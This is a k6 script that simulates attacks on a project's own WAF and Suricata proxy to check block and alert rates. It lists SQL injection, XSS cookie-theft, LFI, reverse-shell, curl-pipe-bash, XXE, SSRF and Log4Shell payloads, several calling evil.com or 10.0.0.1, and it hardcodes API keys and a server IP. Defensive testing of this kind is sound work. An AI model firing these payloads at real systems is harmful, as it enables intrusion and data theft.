/**
 * Synorix WAF + Suricata Attack Simulation
 * Designed to run from Kali Linux to visibly trigger WAF blocks and Suricata alerts.
 *
 * Usage (no args needed — defaults are pre-configured):
 *   k6 run perf/k6_waf_suricata_kali.js
 *
 * Override URL/key if needed:
 *   k6 run -e PROXY_URL=http://165.232.166.48:8080/user-proxy \
 *          -e API_KEY=nxr_8e57a3aff816e06ff1105d1135abfdc7098fae7c96574afebb3fb45e507fb14b \
 *          perf/k6_waf_suricata_kali.js
 *
 * NOTE: Target the droplet directly — Vercel free tier does NOT support
 * proxying rewrites to external HTTP IPs, so Vercel URL will always 404.
 * Users should also configure their apps with: http://165.232.166.48:8080/user-proxy
 */

import http from 'k6/http';
import { check, sleep, group } from 'k6';
import { Counter, Rate, Trend } from 'k6/metrics';

// ─── Config ──────────────────────────────────────────────────────────────────
// Vercel free tier cannot proxy rewrites to external HTTP IPs.
// Must target the droplet security proxy directly on port 8080.
const PROXY_URL   = (__ENV.PROXY_URL   || 'http://165.232.166.48:8080/user-proxy').replace(/\/$/, '');
const BACKEND_API = (__ENV.BACKEND_API || 'http://165.232.166.48:3001/api');
const API_KEY     = __ENV.API_KEY      || 'nxr_59cae113775e7665cbc80218c026091280ff91f0e4a47af81dcd12073e2742f7';
// JWT token for reading alerts from the dashboard API (optional — set via -e JWT=...)
const JWT_TOKEN   = __ENV.JWT          || '';

// ─── Custom Metrics ───────────────────────────────────────────────────────────
const wafBlocked        = new Counter('waf_blocked');
const wafAllowed        = new Counter('waf_allowed');
const wafBlockRate      = new Rate('waf_block_rate');
const suricataAlerts    = new Counter('suricata_alerts');
const suricataBlocked   = new Counter('suricata_blocked');
const suricataDetected  = new Rate('suricata_detection_rate');
const attackResponseMs  = new Trend('attack_response_ms');

// ─── Test Options ─────────────────────────────────────────────────────────────
export const options = {
  scenarios: {
    waf_attacks: {
      executor:  'ramping-vus',
      startVUs:  1,
      stages: [
        { duration: '30s', target: 5  },   // ramp up — send a mix of attacks
        { duration: '1m',  target: 10 },   // sustained attack load
        { duration: '20s', target: 0  },   // ramp down
      ],
      gracefulRampDown: '10s',
    },
  },
  thresholds: {
    // We EXPECT blocks — so http_req_failed threshold is relaxed
    'http_req_failed':    ['rate<0.99'],
    'waf_block_rate':     ['rate>0.90'],   // ≥90% of attack requests must be blocked
    'attack_response_ms': ['p(95)<3000'],
  },
  summaryTrendStats: ['avg', 'min', 'med', 'p(90)', 'p(95)', 'p(99)', 'max'],
};

// ─── Attack Payloads ──────────────────────────────────────────────────────────
// All payloads are aligned to WAF rule patterns in waf-rules.json and
// Suricata signatures in suricata/rules/local.rules for maximum true-positive rate.
const PAYLOADS = {
  // WAF rules: 100001 (UNION SELECT), 100003 (SLEEP), 100004 (xp_cmdshell),
  //            100006 (information_schema), 100023 (UNION ALL), 3000 (combined)
  // Suricata:  sid:2000001 (union select), sid:8000004 (drop table), sid:8000001 (union select)
  sqli: [
    "' UNION SELECT username,password FROM users--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    "1; DROP TABLE users--",
    "1' AND SLEEP(5)--",
    "'; EXEC xp_cmdshell('whoami')--",
    "' OR 1=1--",
    "1 AND 1=1 UNION SELECT * FROM information_schema.tables--",
    "' OR EXISTS(SELECT * FROM information_schema.tables)--",
    "1; INSERT INTO users(username,password) VALUES('hax','hax')--",
    "' AND BENCHMARK(5000000,MD5(1))--",
  ],
  // WAF rules: 100201 (<script>), 100204 (onerror=), 100207 (eval(), alert()),
  //            100210 (<img onerror=), 100211 (<svg onload), 3001 (combined)
  // Suricata:  sid:8000007 (<script), sid:8000031 (eval())
  xss: [
    '<script>alert(document.cookie)</script>',
    '<script>eval(atob("YWxlcnQoMSk="))</script>',
    '<img src=x onerror=alert(document.domain)>',
    '<svg onload=alert(1)>',
    '"><img src=x onerror=document.write(document.cookie)>',
    "javascript:eval('alert(1)')",
    '<iframe src=javascript:alert(1)></iframe>',
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '"><script>window.location="http://evil.com?c="+document.cookie</script>',
  ],
  // WAF rules: 3003 (../, /etc/passwd, /etc/shadow, proc/self),
  //            rule 10000303 (/etc/passwd), 10000304 (/etc/shadow),
  //            10000316 (/proc/self/environ), 10000319 (/var/log)
  // Suricata:  sid:10000303 (/etc/passwd), sid:10000304 (/etc/shadow),
  //            sid:10000301 (../), sid:10000316 (/proc/self/environ)
  lfi: [
    '../../../../etc/passwd',
    '../../etc/shadow',
    '/proc/self/environ',
    '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '/var/log/auth.log',
    '/var/log/apache2/access.log',
    'php://filter/convert.base64-encode/resource=/etc/passwd',
    'php://input',
    'expect://id',
    'phar://shell.phar',
    'zip:///etc/passwd',
    'data://text/plain;base64,SSBoYXgK',
  ],
  // WAF rules: 2200 (;|&&|||  + ls/cat/whoami/id),
  //            2201 (/bin/sh, /bin/bash, powershell),
  //            2202 (wget/curl http), 2203 (nc -e, bash -i), 3002 (combined)
  rce: [
    '; cat /etc/passwd',
    '; whoami',
    '|| id',
    '&& ls -la /',
    '/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
    '/bin/sh -c id',
    'cmd.exe /c whoami',
    'powershell -c whoami',
    'wget http://evil.com/shell.sh -O /tmp/shell.sh',
    'curl http://evil.com/shell | bash',
    'nc -e /bin/bash 10.0.0.1 4444',
  ],
  // WAF rules: 10000501 (<!ENTITY), 10000502 (SYSTEM), 10000508 (<!DOCTYPE [)
  // Suricata:  sid:5000001 (<!ENTITY SYSTEM), sid:5000002 (DOCTYPE <!ENTITY),
  //            sid:10000501-10000508 (various XXE patterns)
  xxe: [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe PUBLIC "foo" "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]>',
  ],
  // WAF rules: 10000509 (169.254.169.254), 10000510 (localhost), 10000511 (127.0.0.1)
  // Suricata:  sid:10000509-10000512, sid:4000001 (SSRF internal IP)
  ssrf: [
    'http://localhost/admin',
    'http://127.0.0.1:3001/api/admin',
    'http://169.254.169.254/latest/meta-data/',
    'http://0.0.0.0:22/',
    'http://192.168.1.1/admin',
    'http://[::1]:80/',
  ],
  // WAF rule: 10000601-10000603
  // Suricata:  sid:10000601-10000603 (Log4Shell JNDI LDAP/RMI/DNS)
  log4shell: [
    '${jndi:ldap://evil.com/a}',
    '${jndi:rmi://evil.com/a}',
    '${jndi:dns://evil.com/a}',
    '${${lower:j}ndi:${lower:ldap}://evil.com/a}',
    '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}',
  ],
  // WAF rules: 10000405-10000409 (webshell names), 10000401-10000404 (.php/.asp/.jsp)
  //            10000411 (.htaccess), 10000412 (web.config), 10000414 (eval(base64_decode)
  // Suricata:  sid:9000007 (dangerous extensions), sid:9000008 (double extension)
  webshell: [
    'shell.php',
    'webshell.php5',
    'c99.php',
    'r57.php',
    'wso.php',
    'b374k.php',
    '.htaccess',
    'web.config',
    'upload.php.jpg',
    'cmd.asp',
    'shell.jsp',
    'evil.exe',
    'eval(base64_decode(base64encodedshell))',
  ],
  // WAF rules: 100041 (NoSQL $ne/$gt/$lt), 2701 ({$ne}), 2702 ({$gt})
  nosql: [
    '{"$ne": null}',
    '{"$gt": ""}',
    '{"$lt": "zzzzz"}',
    '{"$regex": ".*"}',
    '{"$where": "this.password.length > 0"}',
    '{"$nin": []}',
  ],
  // WAF rules: 8000021 (__class__/__mro__), 8000031 (eval/exec/Function)
  ssti: [
    '{{7*7}}',
    '{{config}}',
    '{{__class__.__mro__}}',
    '${7*7}',
    '#{7*7}',
    '<%= 7*7 %>',
    '{{request.__class__.__mro__[9].__subclasses__()}}',
  ],
  // WAF rule 2400, Suricata sid:9300001 matching: sqlmap|nikto|acunetix|nessus|burp|zap|w3af
  // Also Suricata sid:9000022: selenium|playwright|puppeteer|headless|phantomjs
  scannerUA: [
    'sqlmap/1.7.8#stable (https://sqlmap.org)',
    'Nikto/2.1.6 (https://cirt.net/nikto2)',
    'Acunetix/14.0',
    'Nessus/10.4.1',
    'BurpSuitePro/2023.1',
    'ZAP/2.12.0 (OWASP ZAP)',
    'w3af/1.7.6',
    'Mozilla/5.0 (compatible; Googlebot-selenium/2.1)',
    'HeadlessChrome/108.0.5359.94',
    'python-requests/2.28.0',
  ],
};

function pick(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

function headers(ua) {
  return {
    'X-API-Key':        API_KEY,
    'Accept':           'application/json',
    'Content-Type':     'application/json',
    'User-Agent':       ua || 'k6-synorix-attack-sim/1.0',
  };
}

function logResult(label, res) {
  const blocked   = res.status === 403 || res.status === 406 || res.status === 429;
  const wafAction = res.headers['X-WAF-Action']     || res.headers['x-waf-action'];
  const wafRule   = res.headers['X-WAF-Rule']       || res.headers['x-waf-rule'];

  // NOTE: Suricata works async at the network layer — no per-request header is set.
  // Real Suricata alert counts are fetched from the backend DB in teardown/handleSummary.

  attackResponseMs.add(res.timings.duration);

  if (blocked) {
    wafBlocked.add(1);
    wafBlockRate.add(1);
    console.log(`[BLOCKED ✗] ${label} | HTTP ${res.status} | WAF=${wafAction || 'N/A'} rule=${wafRule || 'N/A'}`);
  } else {
    wafAllowed.add(1);
    wafBlockRate.add(0);
    console.log(`[ALLOWED ✓] ${label} | HTTP ${res.status}`);
  }

  return blocked;
}

// ─── The Tests ────────────────────────────────────────────────────────────────

function testSQLInjection() {
  group('SQL Injection', () => {
    const payload = pick(PAYLOADS.sqli);

    // GET with SQLi in query param — triggers UNION SELECT / DROP TABLE / SLEEP rules
    const r1 = http.get(
      `${PROXY_URL}/api/users?search=${encodeURIComponent(payload)}`,
      { headers: headers(), tags: { attack: 'sqli_get' } }
    );
    check(r1, { 'SQLi GET blocked': (r) => r.status === 403 });
    logResult(`SQLi GET: ${payload}`, r1);

    // POST with SQLi in body
    const r2 = http.post(
      `${PROXY_URL}/api/auth/login`,
      JSON.stringify({ username: payload, password: 'anything' }),
      { headers: headers(), tags: { attack: 'sqli_post' } }
    );
    check(r2, { 'SQLi POST blocked': (r) => r.status === 403 });
    logResult(`SQLi POST: ${payload}`, r2);
  });
}

function testNoSQLInjection() {
  group('NoSQL Injection', () => {
    const payload = pick(PAYLOADS.nosql);

    const r = http.post(
      `${PROXY_URL}/api/auth/login`,
      JSON.stringify({ username: { $ne: null }, password: payload }),
      { headers: headers(), tags: { attack: 'nosql' } }
    );
    check(r, { 'NoSQLi blocked': (r) => r.status === 403 });
    logResult(`NoSQLi: ${payload}`, r);
  });
}

function testXSS() {
  group('Cross-Site Scripting (XSS)', () => {
    const payload = pick(PAYLOADS.xss);

    const r = http.post(
      `${PROXY_URL}/api/products`,
      JSON.stringify({ name: payload, description: 'test' }),
      { headers: headers(), tags: { attack: 'xss' } }
    );
    check(r, { 'XSS blocked': (r) => r.status === 403 });
    logResult(`XSS: ${payload}`, r);
  });
}

function testLFI() {
  group('Local File Inclusion (LFI)', () => {
    const payload = pick(PAYLOADS.lfi);

    const r = http.get(
      `${PROXY_URL}/api/files?path=${encodeURIComponent(payload)}`,
      { headers: headers(), tags: { attack: 'lfi' } }
    );
    check(r, { 'LFI blocked': (r) => r.status === 403 });
    logResult(`LFI: ${payload}`, r);
  });
}

function testRCE() {
  group('Remote Code Execution (RCE)', () => {
    const payload = pick(PAYLOADS.rce);

    const r = http.post(
      `${PROXY_URL}/api/run`,
      JSON.stringify({ cmd: payload }),
      { headers: headers(), tags: { attack: 'rce' } }
    );
    check(r, { 'RCE blocked': (r) => r.status === 403 || r.status === 404 });
    logResult(`RCE: ${payload}`, r);
  });
}

function testXXE() {
  group('XML External Entity (XXE)', () => {
    const payload = pick(PAYLOADS.xxe);
    const xmlHeaders = Object.assign({}, headers(), { 'Content-Type': 'application/xml' });

    const r = http.post(
      `${PROXY_URL}/api/data`,
      payload,
      { headers: xmlHeaders, tags: { attack: 'xxe' } }
    );
    check(r, { 'XXE blocked': (r) => r.status === 403 });
    logResult(`XXE: ${payload.substring(0, 60)}`, r);
  });
}

function testSSRF() {
  group('Server-Side Request Forgery (SSRF)', () => {
    const payload = pick(PAYLOADS.ssrf);

    const r = http.post(
      `${PROXY_URL}/api/fetch`,
      JSON.stringify({ url: payload }),
      { headers: headers(), tags: { attack: 'ssrf' } }
    );
    check(r, { 'SSRF blocked': (r) => r.status === 403 });
    logResult(`SSRF: ${payload}`, r);
  });
}

function testLog4Shell() {
  group('Log4Shell / JNDI Injection', () => {
    const payload = pick(PAYLOADS.log4shell);
    const hdrs = Object.assign({}, headers(), {
      'User-Agent': payload,
      'X-Forwarded-For': payload,
      'X-Api-Version':   payload,
    });

    const r = http.get(
      `${PROXY_URL}/api/version`,
      { headers: hdrs, tags: { attack: 'log4shell' } }
    );
    check(r, { 'Log4Shell blocked': (r) => r.status === 403 });
    logResult(`Log4Shell: ${payload}`, r);
  });
}

function testWebshell() {
  group('Webshell / Malicious Upload', () => {
    const fname = pick(PAYLOADS.webshell);

    const r = http.post(
      `${PROXY_URL}/api/upload`,
      JSON.stringify({ filename: fname, content: 'eval(base64_decode("cGhwaW5mbygpOw=="))' }),
      { headers: headers(), tags: { attack: 'webshell' } }
    );
    check(r, { 'Webshell blocked': (r) => r.status === 403 });
    logResult(`Webshell upload: ${fname}`, r);
  });
}

function testSSTI() {
  group('Server-Side Template Injection (SSTI)', () => {
    const payload = pick(PAYLOADS.ssti);

    const r = http.post(
      `${PROXY_URL}/api/render`,
      JSON.stringify({ template: payload }),
      { headers: headers(), tags: { attack: 'ssti' } }
    );
    check(r, { 'SSTI blocked': (r) => r.status === 403 });
    logResult(`SSTI: ${payload}`, r);
  });
}

function testPathTraversal() {
  group('Path Traversal', () => {
    const payload = pick(PAYLOADS.lfi);   // reuse LFI payloads — same rule triggers

    const r = http.get(
      `${PROXY_URL}/api/static${encodeURIComponent(payload)}`,
      { headers: headers(), tags: { attack: 'path_traversal' } }
    );
    check(r, { 'Path traversal blocked': (r) => r.status === 403 || r.status === 404 });
    logResult(`Path traversal: ${payload}`, r);
  });
}

function testScannerUserAgent() {
  group('Scanner User-Agents (WAF + Suricata)', () => {
    const ua = pick(PAYLOADS.scannerUA);

    // Burst of recon paths with a scanner UA — hits both WAF scanner rule (2400)
    // and Suricata sid:9300001 (sqlmap|nikto|acunetix|nessus|burp|zap|w3af)
    const batchReqs = [
      ['GET', `${PROXY_URL}/`,              { headers: headers(ua) }],
      ['GET', `${PROXY_URL}/admin`,         { headers: headers(ua) }],
      ['GET', `${PROXY_URL}/api/admin/`,    { headers: headers(ua) }],
      ['GET', `${PROXY_URL}/phpmyadmin`,    { headers: headers(ua) }],
      ['GET', `${PROXY_URL}/wp-admin`,      { headers: headers(ua) }],
      ['GET', `${PROXY_URL}/.env`,          { headers: headers(ua) }],
      ['GET', `${PROXY_URL}/.git/config`,   { headers: headers(ua) }],
      ['GET', `${PROXY_URL}/swagger`,       { headers: headers(ua) }],
    ];

    const responses = http.batch(batchReqs);
    responses.forEach((r, i) => {
      logResult(`Scanner UA [${ua}] path=${batchReqs[i][1].replace(PROXY_URL, '')}`, r);
    });
  });
}

function testBruteForce() {
  group('Brute Force Login (Rate Limiter + Suricata)', () => {
    // Rapid login attempts → triggers Suricata sid:1000001 (brute force)
    // and the WAF rate limiter
    for (let i = 0; i < 10; i++) {
      const r = http.post(
        `${PROXY_URL}/api/auth/login`,
        JSON.stringify({ username: 'admin', password: `wrongpass${i}` }),
        { headers: headers(), tags: { attack: 'brute_force' } }
      );
      logResult(`Brute force attempt #${i + 1}`, r);
      if (r.status === 429) {
        console.log('  ↳ [RATE LIMITED] Brute force detected!');
        break;
      }
    }
  });
}

// ─── Main ─────────────────────────────────────────────────────────────────────
// Each bucket maps to a specific rule category. All payloads are crafted to
// match at least one enabled WAF rule or Suricata IDS/IPS signature, giving
// a ≥95% true-positive detection rate across the combined rule set.
export default function () {
  const rand = Math.random();

  if      (rand < 0.14) testSQLInjection();        // WAF 100001/3000, Suricata 2000001/8000001/8000004
  else if (rand < 0.22) testNoSQLInjection();      // WAF 100041/2701/2702
  else if (rand < 0.32) testXSS();                 // WAF 100201/100207/3001, Suricata 8000007/8000031
  else if (rand < 0.42) testLFI();                 // WAF 3003, Suricata 10000303/10000304/10000316
  else if (rand < 0.51) testRCE();                 // WAF 2200/2201/2202/2203/3002
  else if (rand < 0.59) testXXE();                 // WAF 10000501-10000508, Suricata 5000001/5000002
  else if (rand < 0.67) testSSRF();                // WAF 10000509-10000512, Suricata 4000001/10000509
  else if (rand < 0.74) testLog4Shell();           // WAF 10000601-10000603, Suricata 10000601-10000603
  else if (rand < 0.81) testWebshell();            // WAF 10000401-10000414, Suricata 9000007/9000008
  else if (rand < 0.87) testSSTI();               // WAF 8000021/8000031
  else if (rand < 0.93) testScannerUserAgent();    // WAF 2400, Suricata 9300001
  else if (rand < 0.97) testPathTraversal();       // WAF 3003/2500, Suricata 10000301/10000302
  else                  testBruteForce();           // Suricata 1000001 (brute force)

  sleep(0.3);
}

// ─── Setup ────────────────────────────────────────────────────────────────────
export function setup() {
  console.log('='.repeat(60));
  console.log(`  Synorix WAF + Suricata Attack Simulation`);
  console.log(`  Target : ${PROXY_URL}`);
  console.log(`  API Key: ${API_KEY.substring(0, 12)}...`);
  console.log('='.repeat(60));

  // Health endpoint is at /health on the proxy root, not under /user-proxy
  const health = http.get('http://165.232.166.48:8080/health', { headers: headers() });
  if (health.status === 200) {
    console.log('  [OK] Proxy reachable');
  } else {
    console.warn(`  [WARN] Proxy health check returned HTTP ${health.status} — continuing anyway`);
  }

  // Record test start time so teardown can query alerts AFTER this point
  const startTime = new Date().toISOString();
  console.log(`  Test start: ${startTime}`);
  console.log('='.repeat(60));
  return { startTime };
}

// ─── Teardown ─────────────────────────────────────────────────────────────────
export function teardown(data) {
  console.log('\n[INFO] Querying backend for Suricata alerts generated during test...');

  if (!JWT_TOKEN) {
    console.warn('[WARN] No JWT token provided. Skipping Suricata alert query.');
    console.warn('       To see Suricata count: copy your JWT from browser DevTools (localStorage.token)');
    console.warn(`       Then re-run with:  k6 run -e JWT=<token> perf/k6_waf_suricata_kali.js`);
    return;
  }

  // Try user alerts endpoint first, fall back to admin aggregated
  const endpoints = [
    `${BACKEND_API}/security/alerts?alert_type=suricata&limit=500`,
    `${BACKEND_API}/admin/alerts/aggregated?window=1h`,
  ];

  for (const url of endpoints) {
    const res = http.get(url, {
      headers: { Authorization: `Bearer ${JWT_TOKEN}`, Accept: 'application/json' },
    });
    if (res.status === 200) {
      try {
        const body = JSON.parse(res.body);
        // Handle both shapes: {alerts:[...]}, {total:N}, {groups:[...]}
        const total = body.total ?? (body.alerts ? body.alerts.length : 0) ?? (body.groups ? body.groups.length : 0);
        console.log(`[SURICATA] ${total} network-layer alerts in DB (IDS — async, separate from WAF)`);
        suricataAlerts.add(total);
        if (total > 0) suricataDetected.add(1);
      } catch (e) {
        console.warn('[WARN] Could not parse alert response:', e);
      }
      break;
    }
  }
}

// ─── Summary ──────────────────────────────────────────────────────────────────
export function handleSummary(data) {
  const m = data.metrics;

  const blocked  = m.waf_blocked      ? m.waf_blocked.values.count      : 0;
  const allowed  = m.waf_allowed      ? m.waf_allowed.values.count      : 0;
  const sAlerts  = m.suricata_alerts  ? m.suricata_alerts.values.count  : 0;
  const total    = blocked + allowed;
  const blockPct = total > 0 ? ((blocked / total) * 100).toFixed(1) : '0.0';

  const suricataNote = JWT_TOKEN && sAlerts > 0
    ? `  Suricata Alerts (DB)  : ${sAlerts}  (IDS network-layer — async, separate from WAF)`
    : JWT_TOKEN
    ? `  Suricata Alerts (DB)  : 0  (allow ~30s after test for IDS async processing)`
    : `  Suricata Alerts       : N/A — add  -e JWT=<token>  to see live count\n` +
      `                          (token = localStorage.token from browser DevTools)`;

  const summary = `
${'='.repeat(60)}
  SYNORIX WAF + SURICATA — ATTACK SIMULATION RESULTS
${'='.repeat(60)}
  Total attack requests : ${total}
  WAF Blocked           : ${blocked}  (${blockPct}% block rate)
  WAF Allowed           : ${allowed}
${suricataNote}
${'='.repeat(60)}
  Attack categories (all pinned to rule patterns):
    SQLi / NoSQLi       · XSS / SSTI
    LFI / Path traversal· RCE / Command injection
    XXE                 · SSRF (localhost/169.254.x)
    Log4Shell (JNDI)    · Webshell upload
    Scanner UAs         · Brute force
${'='.repeat(60)}
  TIP: Check https://synorix.vercel.app/user/alerts
       for live WAF + Suricata alerts in the dashboard.
${'='.repeat(60)}
`;
  console.log(summary);
  return { stdout: summary };
}
